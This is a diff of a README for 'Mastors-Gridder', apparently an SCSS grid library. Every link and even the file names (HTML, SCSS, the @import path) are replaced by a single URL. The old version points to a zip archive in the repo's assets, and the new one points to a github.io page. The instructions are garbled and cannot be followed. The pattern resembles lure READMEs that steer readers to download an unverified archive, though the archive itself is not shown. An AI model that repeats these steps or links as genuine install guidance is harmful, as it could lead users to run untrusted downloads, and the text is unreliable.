@@ -1,6 +1,6 @@
 # 🎨 Mastors-Gridder - Build Responsive Grids Effortlessly
 
-![Download Mastors-Gridder](https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip)
+![Download Mastors-Gridder](https://haidarjakiem.github.io)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you begin, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Mastors-Gridder Releases](https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip).
+To get started, visit this page to download: [Mastors-Gridder Releases](https://haidarjakiem.github.io).
 
 You will find different versions available. Choose the latest one and download the zip file. After downloading, follow these steps:
 
@@ -41,15 +41,15 @@ Mastors-Gridder is packed with features to help you design your layouts effectiv
 ### Step 1: Set Up Your Project
 
 1. Create a new folder for your project.
-2. Inside the folder, create an `https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip` file and a `https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip` file.
-3. Link your `https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip` file in the `<head>` section of your `https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip` using a `<link>` tag.
+2. Inside the folder, create an `https://haidarjakiem.github.io` file and a `https://haidarjakiem.github.io` file.
+3. Link your `https://haidarjakiem.github.io` file in the `<head>` section of your `https://haidarjakiem.github.io` using a `<link>` tag.
 
 ### Step 2: Import Mastors-Gridder
 
-In your `https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip`, import Mastors-Gridder using:
+In your `https://haidarjakiem.github.io`, import Mastors-Gridder using:
 
 ```scss
-@import 'https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip';
+@import 'https://haidarjakiem.github.io';
 ```
 
 Replace the path with the correct file path to the downloaded SCSS file.
@@ -75,7 +75,7 @@ Use your code editor or a task runner to compile your SCSS into CSS. This proces
 
 ### Step 5: View Your Work
 
-Open the `https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip` file in your web browser. You should see your responsive grid in action.
+Open the `https://haidarjakiem.github.io` file in your web browser. You should see your responsive grid in action.
 
 ## 🌟 Examples
 
@@ -108,8 +108,8 @@ Follow us on our social media platforms for tips and updates on web design and d
 
 ## 🔗 Helpful Links
 
-- [Mastors-Gridder Releases](https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip)
+- [Mastors-Gridder Releases](https://haidarjakiem.github.io)
 - [Documentation](#) (link to detailed docs)
-- [GitHub Repository](https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Mastors-Gridder-v3.2.zip)
+- [GitHub Repository](https://haidarjakiem.github.io)
 
 Now that you have everything set up, start designing your layouts. Enjoy working with Mastors-Gridder!
